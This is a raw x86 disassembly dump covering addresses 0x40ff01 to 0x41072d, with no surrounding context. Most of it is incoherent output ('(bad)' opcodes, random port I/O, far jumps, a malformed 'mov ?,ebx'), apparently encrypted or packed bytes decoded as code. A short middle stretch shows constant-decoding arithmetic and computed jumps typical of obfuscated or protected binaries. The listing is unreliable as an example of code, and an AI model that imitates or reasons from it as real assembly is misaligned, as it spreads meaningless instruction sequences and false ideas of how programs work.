  40ff01:	(bad)  
  40ff03:	sub    dh,BYTE PTR [eax-0x2c00b74f]
  40ff09:	fs jbe 0x40feb8
  40ff0c:	mov    edi,ebx
  40ff0e:	push   ebp
  40ff0f:	xchg   edx,eax
  40ff10:	mov    ds:0x3af8537,al
  40ff15:	push   edi
  40ff16:	aaa    
  40ff17:	xor    edi,DWORD PTR ds:[edi]
  40ff1a:	mov    ds:0xe287fc,al
  40ff1f:	test   BYTE PTR [edx+0x2701ad9c],ch
  40ff25:	pop    edx
  40ff26:	inc    DWORD PTR [esi-0x721b13f0]
  40ff2c:	not    DWORD PTR [ebp+edi*2+0x45a283ee]
  40ff33:	jns    0x40ff50
  40ff35:	jle    0x40ff53
  40ff37:	dec    esp
  40ff38:	mov    BYTE PTR [eax],ah
  40ff3a:	inc    esi
  40ff3b:	iret   
  40ff3c:	push   ebx
  40ff3d:	test   dh,bh
  40ff3f:	pop    edi
  40ff40:	mov    ds:0x25fba6bc,al
  40ff45:	or     BYTE PTR [ecx+0x34],dh
  40ff48:	xchg   ebx,eax
  40ff49:	xchg   ecx,eax
  40ff4a:	jmp    0xb89:0x93e1018b
  40ff51:	mov    DWORD PTR [edx+0x60906d77],eax
  40ff57:	inc    cl
  40ff59:	out    dx,al
  40ff5a:	mov    ebp,0x6a0986fd
  40ff5f:	loop   0x40ff54
  40ff61:	addr16 loop 0x40ffc8
  40ff64:	pop    edx
  40ff65:	bound  eax,QWORD PTR [ecx+0x5ef94e3]
  40ff6b:	gs and al,0x90
  40ff6e:	aaa    
  40ff6f:	in     eax,dx
  40ff70:	mov    dh,0x58
  40ff72:	fisttp DWORD PTR [ebp-0x16bc224d]
  40ff78:	aam    0x2c
  40ff7a:	push   edx
  40ff7b:	ret    0x990d
  40ff7e:	xlat   BYTE PTR ds:[ebx]
  40ff7f:	gs dec ebx
  40ff81:	gs aaa 
  40ff83:	adc    al,0xe1
  40ff85:	or     eax,DWORD PTR ds:0x15480ace
  40ff8b:	xchg   ebp,eax
  40ff8c:	sbb    esp,ebp
  40ff8e:	mov    ds:0xd76a50b8,al
  40ff93:	dec    edx
  40ff94:	push   ds
  40ff95:	out    dx,eax
  40ff96:	xor    esi,0xffffff93
  40ff99:	inc    ebp
  40ff9a:	ins    BYTE PTR es:[edi],dx
  40ff9b:	sbb    bh,BYTE PTR [edi+0x78]
  40ff9e:	mov    edx,0x8943e6f2
  40ffa3:	sbb    eax,0xe34b336f
  40ffa8:	rcl    esp,1
  40ffaa:	sbb    al,0x31
  40ffac:	push   DWORD PTR [eax+0x3173030]
  40ffb2:	dec    edi
  40ffb3:	pop    ebx
  40ffb4:	ret    0x1af9
  40ffb7:	mov    ebx,0x8504bc7a
  40ffbc:	lahf   
  40ffbd:	sbb    BYTE PTR ds:0x4a607fb1,0x25
  40ffc4:	add    DWORD PTR [ecx-0x2fb05759],esp
  40ffca:	xlat   BYTE PTR ds:[ebx]
  40ffcb:	int3   
  40ffcc:	popa   
  40ffcd:	and    DWORD PTR [ecx-0x17],edx
  40ffd0:	or     ebx,DWORD PTR [ecx+0x55b7d64c]
  40ffd6:	imul   ebp,DWORD PTR [esi-0x29],0x5a8f252c
  40ffdd:	test   edx,0xb1fb65e9
  40ffe3:	call   DWORD PTR [edx]
  40ffe5:	addr16 out 0x8e,al
  40ffe8:	xlat   BYTE PTR ds:[ebx]
  40ffe9:	test   BYTE PTR [esi-0x34690166],bl
  40ffef:	push   es
  40fff0:	mov    cl,0xb3
  40fff2:	dec    edi
  40fff3:	ins    DWORD PTR es:[edi],dx
  40fff4:	sar    ebp,0xaf
  40fff7:	xor    esi,DWORD PTR [edx+0x6a]
  40fffa:	jmp    0x4cd6d7a6
  40ffff:	shl    edx,cl
  410001:	pop    ecx
  410002:	(bad)  
  410003:	or     bh,BYTE PTR [ebx+esi*8+0x6074891c]
  41000a:	mov    edx,0xeebec816
  41000f:	data16 ja 0x40ffa8
  410012:	leave  
  410013:	add    edi,DWORD PTR [ecx]
  410015:	fistp  WORD PTR [ecx]
  410017:	xor    eax,0xfa30545d
  41001c:	sbb    DWORD PTR [ebp+0x66fa8e05],esp
  410022:	jge    0x410076
  410024:	inc    esp
  410025:	popa   
  410026:	mov    ah,0x56
  410028:	cwde   
  410029:	es xor eax,0xafc93d14
  41002f:	ins    DWORD PTR es:[edi],dx
  410030:	dec    edi
  410031:	cmp    al,0x3e
  410033:	bound  esp,QWORD PTR [eax+0x774abec5]
  410039:	xchg   DWORD PTR [esi+0x47],ebp
  41003c:	xor    BYTE PTR [ebx+0x7fe1e83c],dl
  410042:	inc    ebp
  410043:	mov    eax,0x8191f9bf
  410048:	rcr    edx,cl
  41004a:	aas    
  41004b:	mov    ds:0xadf34f45,al
  410050:	jne    0x40ffe6
  410052:	imul   ecx,ecx,0x61
  410055:	popf   
  410056:	jnp    0x41004d
  410058:	dec    ebp
  410059:	mov    al,ds:0xb2b7f885
  41005e:	sub    DWORD PTR [ecx],esi
  410060:	mov    ?,ebx
  410062:	ror    ebx,cl
  410064:	pop    edx
  410065:	mov    ah,0xee
  410067:	xchg   ebx,eax
  410068:	cmc    
  410069:	shl    DWORD PTR [esi],cl
  41006b:	mov    esi,0x44c4279e
  410070:	in     eax,dx
  410071:	mov    edx,0xcd58d439
  410076:	es pop edx
  410078:	hlt    
  410079:	sti    
  41007a:	mov    esi,0x2a040ce
  41007f:	push   ebx
  410080:	out    0x1b,eax
  410082:	push   0xffffffa1
  410084:	fwait
  410085:	je     0x4100df
  410087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410088:	jecxz  0x4100fc
  41008a:	jnp    0x4100a5
  41008c:	or     eax,0x200256e7
  410091:	mov    ch,0xc3
  410093:	scas   eax,DWORD PTR es:[edi]
  410094:	loopne 0x41002a
  410096:	adc    BYTE PTR cs:[esp+eax*8+0x33],0x8d
  41009c:	test   dh,al
  41009e:	cmc    
  41009f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100a0:	jl     0x410033
  4100a2:	jno    0x410087
  4100a4:	outs   dx,DWORD PTR ds:[esi]
  4100a5:	test   BYTE PTR [edi+0x78],ah
  4100a8:	cmp    eax,0x47fbb971
  4100ad:	jmp    0xd024:0x86e78d38
  4100b4:	test   DWORD PTR [ecx+0x450630fb],esp
  4100ba:	mov    ecx,ss
  4100bc:	pop    ss
  4100bd:	and    BYTE PTR [edi+ebp*1+0x565759c8],cl
  4100c4:	add    al,0xb5
  4100c6:	mov    eax,0x26bff031
  4100cb:	sub    edi,eax
  4100cd:	push   edx
  4100ce:	jge    0x410149
  4100d0:	adc    eax,0x9aa44d7f
  4100d5:	dec    ebp
  4100d6:	mov    ecx,0x4f79ad61
  4100db:	pop    ebp
  4100dc:	ins    DWORD PTR es:[edi],dx
  4100dd:	inc    esi
  4100de:	jp     0x4100ce
  4100e0:	inc    eax
  4100e1:	mov    bh,0x4
  4100e3:	ins    BYTE PTR es:[di],dx
  4100e5:	xchg   BYTE PTR [edi],dh
  4100e7:	jge    0x410081
  4100e9:	imul   esp,DWORD PTR [ebx+0x65],0xfffffff9
  4100ed:	adc    eax,0xb4ae891b
  4100f2:	push   ecx
  4100f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100f4:	enter  0x145,0x3c
  4100f8:	mov    ss,WORD PTR [edx]
  4100fa:	int3   
  4100fb:	or     al,0x3b
  4100fd:	or     cl,BYTE PTR [ebx]
  4100ff:	dec    eax
  410100:	sbb    DWORD PTR [edi+0x5d],edx
  410103:	mov    WORD PTR [ebx-0x51],cs
  410106:	mov    ebx,0x32c0f7d9
  41010b:	mov    edi,0xa5b428a
  410110:	test   al,0xea
  410112:	es add DWORD PTR gs:[eax-0x3ea73e10],esi
  41011a:	jecxz  0x4100e0
  41011c:	jge    0x4100f0
  41011e:	dec    edi
  41011f:	adc    edx,ebx
  410121:	stos   BYTE PTR es:[edi],al
  410122:	add    ch,dl
  410124:	xor    DWORD PTR [ecx],ebx
  410126:	or     eax,DWORD PTR [edi+eax*4+0x1434f9b7]
  41012d:	jb     0x410121
  41012f:	add    BYTE PTR [ebx],0xe7
  410132:	jecxz  0x410155
  410134:	mov    dl,0x53
  410136:	dec    edi
  410137:	fwait
  410138:	jg     0x410149
  41013a:	mov    BYTE PTR [ebp+ebp*2+0x2d],cl
  41013e:	mov    cl,0x77
  410140:	inc    edi
  410141:	add    esi,DWORD PTR [ebp-0x3153a293]
  410147:	jmp    0x823a68be
  41014c:	je     0x410107
  41014e:	xchg   ebp,eax
  41014f:	scas   al,BYTE PTR es:[edi]
  410150:	jns    0x41015e
  410152:	js     0x4100d4
  410154:	nop
  410155:	pop    ecx
  410156:	nop
  410157:	call   0xa90dc22e
  41015c:	xor    DWORD PTR [edx+eiz*8+0x1d],ebx
  410160:	into   
  410161:	jns    0x4100ef
  410163:	jmp    0x410170
  410165:	and    eax,0x595df98b
  41016a:	sub    ch,BYTE PTR [ecx]
  41016c:	sub    eax,0xf3a6c109
  410171:	xchg   DWORD PTR [eax-0x6bd61d4c],ebx
  410177:	jb     0x4101a9
  410179:	(bad)  
  41017b:	lods   eax,DWORD PTR ds:[esi]
  41017c:	xchg   DWORD PTR [ecx-0x23],ecx
  41017f:	push   esi
  410180:	test   DWORD PTR ds:0x6a4d015,ebx
  410186:	sub    dl,BYTE PTR [ebx-0x6b]
  410189:	std    
  41018a:	add    eax,0x29109ecd
  41018f:	xor    edi,DWORD PTR [ebx]
  410191:	dec    BYTE PTR [edi+0x7a6e5662]
  410197:	push   edi
  410198:	lea    eax,[esi+0x13eab238]
  41019e:	stc    
  41019f:	jmp    0x334e:0x11c18f6e
  4101a6:	inc    ebx
  4101a7:	xor    BYTE PTR [ebp-0x22c977ae],dl
  4101ad:	call   FWORD PTR [ebx+0x2d]
  4101b0:	add    ah,BYTE PTR [ebp+0x5c966748]
  4101b6:	pop    ebx
  4101b7:	sbb    al,0xfd
  4101b9:	jg     0x410215
  4101bb:	jmp    0x26cf:0x8ba8629f
  4101c2:	jl     0x410215
  4101c4:	repnz test BYTE PTR [ebx+0x57],bl
  4101c8:	aaa    
  4101c9:	sbb    al,0x35
  4101cb:	loopne 0x410217
  4101cd:	dec    ebx
  4101ce:	inc    ebp
  4101cf:	jmp    0xcc05:0xccfc3a04
  4101d6:	sbb    eax,0x6f040ea3
  4101db:	scas   al,BYTE PTR es:[edi]
  4101dc:	sahf   
  4101dd:	stos   DWORD PTR es:[edi],eax
  4101de:	test   BYTE PTR [ebp-0x668ccf78],dh
  4101e4:	addr16 mov ebx,0xd20ec774
  4101ea:	mov    cl,0xb7
  4101ec:	mov    DWORD PTR [ebp-0x143629f],esp
  4101f2:	add    ecx,DWORD PTR [edx]
  4101f4:	std    
  4101f5:	aam    0xe7
  4101f7:	mov    ebp,0xb76bc665
  4101fc:	jne    0x41025c
  4101fe:	push   esi
  4101ff:	ror    DWORD PTR [edx],cl
  410201:	sub    eax,0x3a89c333
  410206:	call   0x354:0x6851b557
  41020d:	retf   0x2812
  410210:	xchg   edx,eax
  410211:	pop    edx
  410212:	scas   al,BYTE PTR es:[edi]
  410213:	je     0x41025f
  410215:	ret    
  410216:	outs   dx,DWORD PTR ds:[esi]
  410217:	sub    eax,0xc3d5a4d9
  41021c:	jmp    0x4101e4
  41021e:	or     BYTE PTR [esp+edi*4],dh
  410221:	in     al,0x9d
  410223:	xchg   DWORD PTR [ebp+esi*1-0x4a],esp
  410227:	test   DWORD PTR [edi],ebx
  410229:	mov    ebp,0x8ff73260
  41022e:	inc    eax
  41022f:	rol    DWORD PTR [esi-0x1],cl
  410232:	jmp    0x4101fb
  410234:	lahf   
  410235:	fwait
  410236:	or     ah,cl
  410238:	xchg   esi,eax
  410239:	leave  
  41023a:	or     eax,0xfc70327
  41023f:	scas   eax,DWORD PTR es:[edi]
  410240:	ret    
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	inc    ecx
  410339:	xor    ah,BYTE PTR [ebx+ebp*4-0x41]
  41033d:	mov    fs,WORD PTR [edx+0x62]
  410340:	or     bl,BYTE PTR [edi+0x62]
  410343:	bound  esp,QWORD PTR [esi-0x48]
  410346:	adc    DWORD PTR [edx*2+0x6d6c3b3f],edi
  41034d:	in     eax,0xa9
  41034f:	call   0x9510:0xa11f7181
  410356:	in     al,dx
  410357:	inc    ebx
  410358:	and    bl,BYTE PTR [eax]
  41035a:	sub    bh,BYTE PTR [esi]
  41035c:	inc    edx
  41035d:	mov    DWORD PTR [ecx+0x19],0x94d8a9b2
  410364:	mov    dl,0x0
  410366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410367:	push   ebx
  410368:	sub    al,0xe2
  41036b:	jmp    0x41039d
  41036d:	mov    ebx,0x2caaa5b8
  410372:	cmp    eax,0xde916945
  410377:	jmp    0x1a572fdd
  41037c:	add    edx,eax
  41037e:	loopne 0x4103de
  410380:	add    al,BYTE PTR ds:0x95321c47
  410386:	fs pop esi
  410388:	push   esp
  410389:	in     al,0xcc
  41038b:	xchg   esi,eax
  41038c:	pop    ds
  41038d:	adc    ch,BYTE PTR [edx]
  41038f:	rol    BYTE PTR ds:0xaf06d2a9,0xbf
  410396:	fdiv   QWORD PTR [edi-0x50]
  410399:	push   eax
  41039a:	dec    ebx
  41039b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41039c:	mul    esp
  41039e:	mov    BYTE PTR [esi+edi*2-0xbfcf06e],dl
  4103a5:	cld    
  4103a6:	cli    
  4103a7:	push   0x1a
  4103a9:	ret    0xcac7
  4103ac:	(bad)  
  4103ad:	mov    esi,0x6a997b6f
  4103b2:	mov    edx,ebp
  4103b4:	jle    0x410400
  4103b6:	loopne 0x41042b
  4103b8:	imul   edx,ecx,0x56aff39b
  4103be:	in     al,0x5c
  4103c0:	push   ebp
  4103c1:	(bad)  
  4103c2:	cmp    BYTE PTR [ebx-0x5bbd2bf8],bl
  4103c8:	add    al,0xca
  4103ca:	js     0x41035c
  4103cc:	popf   
  4103cd:	sbb    eax,0x3cd354b9
  4103d2:	dec    edx
  4103d3:	jge    0x410376
  4103d5:	clc    
  4103d6:	fadd   st(3),st
  4103d8:	out    0xfe,eax
  4103da:	rol    DWORD PTR [eax],0x29
  4103dd:	mov    esi,0x487e6ff3
  4103e2:	xor    eax,0x359d2602
  4103e7:	dec    edx
  4103e8:	jge    0x410401
  4103ea:	sbb    DWORD PTR [ebp-0x3d],ebx
  4103ed:	mov    bh,0xc7
  4103ef:	fs cmp ch,ah
  4103f2:	enter  0x57ab,0x8b
  4103f6:	push   cs
  4103f7:	out    dx,eax
  4103f8:	and    ebx,eax
  4103fa:	inc    edx
  4103fb:	adc    BYTE PTR [esp+edi*8+0x13],bl
  4103ff:	push   esi
  410400:	and    DWORD PTR [esi+0x20],esp
  410403:	(bad)  
  410404:	xchg   ebp,eax
  410405:	mov    edi,0x2b3cc138
  41040a:	cs iret 
  41040c:	into   
  41040d:	sbb    eax,DWORD PTR [edx+eax*1]
  410410:	and    al,0x71
  410412:	cs pop esi
  410414:	pop    edi
  410415:	and    DWORD PTR [esi+0x7c43173],0x4e18389e
  41041f:	adc    BYTE PTR [ebp+0x388c7824],bh
  410425:	jl     0x410405
  410427:	mov    ah,0x65
  410429:	mov    WORD PTR [eax+0x3c8b08a7],cs
  41042f:	sbb    al,0x8b
  410431:	add    DWORD PTR ds:0xb013895c,0xa865326b
  41043b:	inc    esi
  41043c:	arpl   WORD PTR [eax],cx
  41043e:	aad    0xf0
  410440:	push   0xffffffe1
  410442:	rcr    DWORD PTR [eax-0x4ff20522],1
  410448:	enter  0x2c22,0x99
  41044c:	call   0xb31a6a3a
  410451:	mov    ah,0x74
  410453:	fwait
  410454:	(bad)  
  410455:	xor    eax,0xede4c745
  41045a:	mov    BYTE PTR [ecx+0x4f1d5456],bh
  410460:	push   esp
  410461:	cwde   
  410462:	in     al,dx
  410463:	mov    ebp,0xea94dc17
  410468:	repnz retf 0xb386
  41046c:	jne    0x4104cf
  41046e:	sbb    DWORD PTR [ecx],ecx
  410470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410471:	dec    edx
  410472:	adc    eax,0x187acd
  410477:	jmp    ebp
  410479:	pop    ss
  41047a:	clc    
  41047b:	jnp    0x410492
  41047d:	mov    ds:0xd535174b,al
  410482:	sub    BYTE PTR [edi],al
  410484:	fidiv  WORD PTR cs:[esi-0x48]
  410488:	push   eax
  410489:	xchg   edi,eax
  41048a:	push   ebp
  41048b:	nop
  41048c:	xlat   BYTE PTR ds:[ebx]
  41048d:	mov    esi,0xc0826eb2
  410492:	call   0x3e6c:0xae3c0f60
  410499:	jge    0x410445
  41049b:	sbb    edx,DWORD PTR [ebp+0x13]
  41049e:	(bad)  
  41049f:	push   esi
  4104a0:	and    DWORD PTR [esi-0x79],ebp
  4104a3:	fs iret 
  4104a5:	dec    esp
  4104a6:	push   ss
  4104a7:	jp     0x410446
  4104a9:	mov    ecx,0x4c607da7
  4104ae:	mov    ecx,0x99e5059b
  4104b3:	pusha  
  4104b4:	(bad)  
  4104b5:	mov    bl,0xd7
  4104b7:	push   es
  4104b8:	adc    edx,DWORD PTR [edx+0xc]
  4104bb:	in     eax,dx
  4104bc:	bound  ecx,QWORD PTR [ebp-0x59048416]
  4104c2:	pusha  
  4104c3:	xchg   edx,eax
  4104c4:	cdq    
  4104c5:	xor    al,0xa4
  4104c7:	enter  0xff2a,0x53
  4104cb:	push   ebx
  4104cc:	scas   eax,DWORD PTR es:[edi]
  4104cd:	adc    BYTE PTR [edx+ebp*8-0x19],0x33
  4104d2:	cmp    dh,al
  4104d4:	shl    edx,0xe6
  4104d7:	mov    ch,0x77
  4104d9:	jecxz  0x410501
  4104db:	js     0x4104de
  4104dd:	sub    esp,esi
  4104df:	shl    BYTE PTR [ebp-0xa197f4f],0x5d
  4104e6:	scas   al,BYTE PTR es:[edi]
  4104e7:	add    BYTE PTR [edx+ebx*8],ch
  4104ea:	out    dx,al
  4104eb:	arpl   di,bx
  4104ed:	test   DWORD PTR [ecx+0x1700e846],0xe71f2eb8
  4104f7:	ret    
  4104f8:	mov    ebx,0x73bcbfbd
  4104fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104fe:	daa    
  4104ff:	js     0x410579
  410501:	mov    ah,0x3
  410503:	bound  esp,QWORD PTR [edx-0x1d21672f]
  410509:	inc    ebx
  41050a:	out    dx,al
  41050b:	xor    al,ah
  41050d:	mov    edi,0x20f68a0e
  410512:	pop    ds
  410513:	sahf   
  410514:	and    eax,DWORD PTR [ebx-0x47]
  410517:	(bad)  [edi-0x61]
  41051a:	mov    ds:0xcb7fea0d,eax
  41051f:	sti    
  410520:	jns    0x410515
  410522:	je     0x410579
  410524:	xor    cl,BYTE PTR [ecx-0x6a33ca5]
  41052a:	inc    edi
  41052b:	sbb    cl,dl
  41052d:	lds    edx,FWORD PTR [eax+0x25]
  410530:	adc    ebx,DWORD PTR [ecx-0x62]
  410533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410534:	retf   0x531a
  410537:	mov    ds:0xc3a19fdf,eax
  41053c:	(bad)  [ebx+0x7c80e37a]
  410542:	xchg   edx,eax
  410543:	out    0x22,al
  410545:	jp     0x4105bd
  410547:	mov    dh,0x7b
  410549:	out    0x68,eax
  41054b:	aad    0xd3
  41054d:	push   0xffffff8b
  41054f:	and    esp,ebx
  410551:	and    DWORD PTR [edx+0x33],edi
  410554:	xchg   ebx,eax
  410555:	push   0x5b4658da
  41055a:	dec    ebp
  41055b:	xor    DWORD PTR [eax],0xba692cc
  410561:	dec    ecx
  410562:	jb     0x41057c
  410564:	pop    ebp
  410565:	pusha  
  410566:	lahf   
  410567:	pusha  
  410568:	outs   dx,DWORD PTR ds:[esi]
  410569:	cwde   
  41056a:	xor    BYTE PTR [esi-0x5576b790],bh
  410570:	fiadd  WORD PTR ds:0x43ca320c
  410576:	test   BYTE PTR [esi+0x6f7f72d3],bl
  41057c:	es dec esp
  41057e:	or     BYTE PTR [eax+ecx*4],0x28
  410582:	imul   ebx,DWORD PTR [esi],0x5
  410585:	add    eax,DWORD PTR [edi]
  410587:	iret   
  410588:	pop    DWORD PTR [edx]
  41058a:	scas   eax,DWORD PTR es:[edi]
  41058b:	inc    eax
  41058c:	sub    al,0x1b
  41058e:	dec    ebx
  41058f:	call   0x8fb42eb0
  410594:	pop    eax
  410595:	test   BYTE PTR [ebp+0x2b],bh
  410598:	sar    DWORD PTR [ebx],cl
  41059a:	adc    eax,0x6f2f11e3
  41059f:	mov    bl,0x48
  4105a1:	rcr    BYTE PTR [edi-0x37ea2af],1
  4105a7:	aad    0xaf
  4105a9:	loopne 0x410550
  4105ab:	xchg   BYTE PTR [ebx-0x6263c0e4],dl
  4105b1:	test   DWORD PTR [esi],esi
  4105b3:	pop    ss
  4105b4:	jno    0x41061a
  4105b6:	cmp    edi,DWORD PTR [esi]
  4105b8:	lods   eax,DWORD PTR ds:[esi]
  4105b9:	cmp    BYTE PTR [ebx-0x2d],dl
  4105bc:	mov    al,ds:0x2724cd75
  4105c1:	push   ebx
  4105c2:	dec    eax
  4105c3:	out    0xd3,eax
  4105c5:	jp     0x410605
  4105c7:	hlt    
  4105c8:	push   edi
  4105c9:	loope  0x4105ff
  4105cb:	idiv   BYTE PTR [edx-0x66]
  4105ce:	cmp    BYTE PTR [ebx+edi*2+0x37],ch
  4105d2:	xchg   ebp,eax
  4105d3:	in     al,0x21
  4105d5:	inc    esp
  4105d6:	lds    ecx,FWORD PTR [esp+eiz*4+0x6c461f0a]
  4105dd:	add    eax,0xdee2e790
  4105e2:	cmp    eax,0x6218caea
  4105e7:	inc    ecx
  4105e8:	ins    BYTE PTR es:[edi],dx
  4105e9:	gs mov esp,0x8c60754b
  4105ef:	retf   
  4105f0:	ds push edi
  4105f2:	or     bl,BYTE PTR [ebx-0xf]
  4105f5:	sahf   
  4105f6:	xor    al,0x60
  4105f8:	out    dx,eax
  4105f9:	std    
  4105fa:	pop    ebp
  4105fb:	mov    bh,0x84
  4105fd:	sub    dl,ch
  4105ff:	jnp    0x41063b
  410601:	mov    ah,0x53
  410603:	es sbb ah,bh
  410606:	sti    
  410607:	punpckhbw mm1,mm3
  41060a:	cmp    ecx,eax
  41060c:	(bad)  
  41060d:	mov    BYTE PTR [edx],dl
  41060f:	ja     0x410636
  410611:	jl     0x41065d
  410613:	gs jmp 0x585a:0x91ee8c33
  41061b:	cmp    al,0x3a
  41061d:	test   BYTE PTR [edi],al
  41061f:	test   eax,0x19207a11
  410624:	add    DWORD PTR [esi+0x16],esi
  410627:	xchg   esi,eax
  410628:	adc    al,0x43
  41062a:	dec    ecx
  41062b:	icebp  
  41062c:	ror    eax,0x78
  41062f:	adc    eax,0xd75b32cb
  410634:	in     eax,dx
  410635:	and    BYTE PTR [edi+ebp*4-0x39e62c3c],0xf0
  41063d:	mov    ecx,0x8eae9a1f
  410642:	mov    ebp,0xa4e35d82
  410647:	stos   DWORD PTR es:[edi],eax
  410648:	jmp    0x5925:0xf6225628
  41064f:	add    cl,BYTE PTR [edx+edx*8]
  410652:	fs je  0x41063e
  410655:	cld    
  410656:	inc    esp
  410657:	lods   eax,DWORD PTR ds:[esi]
  410658:	(bad)  
  410659:	test   esi,edx
  41065b:	sbb    eax,0xbe592ed5
  410660:	inc    esp
  410661:	in     al,0x95
  410663:	push   esp
  410664:	xor    BYTE PTR [edx],0x90
  410667:	dec    ecx
  410668:	test   eax,0xc2aa4589
  41066d:	scas   al,BYTE PTR es:[edi]
  41066e:	or     BYTE PTR [ebp-0x61],0xec
  410672:	dec    ecx
  410673:	mov    eax,ds:0xb8ef6401
  410678:	les    eax,FWORD PTR [esi-0x7480a53a]
  41067e:	dec    esp
  41067f:	mov    ah,0xc1
  410681:	sub    DWORD PTR [edx],ebx
  410683:	aas    
  410684:	adc    eax,0xb68f2d21
  410689:	repz pusha 
  41068b:	gs aad 0xc2
  41068e:	popf   
  41068f:	or     eax,0xcb13baf0
  410694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410695:	and    eax,0x2bd87c3
  41069a:	femms  
  41069c:	addr16 mov cl,0x33
  41069f:	test   eax,0xa7050e12
  4106a4:	inc    ebx
  4106a5:	add    ebx,DWORD PTR [esi-0x2d]
  4106a8:	mov    al,0xf6
  4106aa:	jmp    0x4106a1
  4106ac:	inc    ecx
  4106ad:	add    DWORD PTR [edi-0xf],0x1f25e8e6
  4106b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106b5:	imul   eax,DWORD PTR [ebx+0x31],0x6e2ad51a
  4106bc:	sub    DWORD PTR [edx-0x32],esi
  4106bf:	or     DWORD PTR [esi-0x9549844],0xffffffc1
  4106c6:	xchg   edi,eax
  4106c7:	int    0x1a
  4106c9:	or     esi,DWORD PTR [edx+0x11b827a1]
  4106cf:	lods   al,BYTE PTR ds:[esi]
  4106d0:	int    0x3
  4106d2:	sbb    eax,0x4adb3292
  4106d7:	jno    0x4106ed
  4106d9:	cli    
  4106da:	pop    eax
  4106db:	jmp    0x46cea916
  4106e0:	aad    0x50
  4106e2:	sbb    DWORD PTR [esi],ebx
  4106e4:	movaps xmm5,xmm0
  4106e7:	stc    
  4106e8:	add    al,0x33
  4106ea:	sahf   
  4106eb:	xor    ah,ch
  4106ed:	cdq    
  4106ee:	mov    ebx,0x9bad14f2
  4106f3:	jp     0x4106b9
  4106f5:	(bad)
  4106f8:	imul   ah
  4106fa:	cmp    DWORD PTR [ebx+0x57],ecx
  4106fd:	sub    esi,edx
  4106ff:	fiadd  DWORD PTR [edi+0x46]
  410702:	xchg   edx,eax
  410703:	hlt    
  410704:	lahf   
  410705:	loop   0x410694
  410707:	jne    0x41068a
  410709:	jbe    0x4106b5
  41070b:	imul   ebx,DWORD PTR [ebp+0x7a],0xffffffe7
  41070f:	test   eax,0x336de144
  410714:	mov    dl,0x98
  410716:	sub    eax,0xb7328f63
  41071b:	add    BYTE PTR [edx-0x79],0xf
  41071f:	jae    0x410720
  410721:	pop    esp
  410722:	ss jg  0x410720
  410725:	jmp    0x4106f2
  410727:	mov    ebp,0xea036f8c
  41072c:	push   edi
  41072d:	hlt    
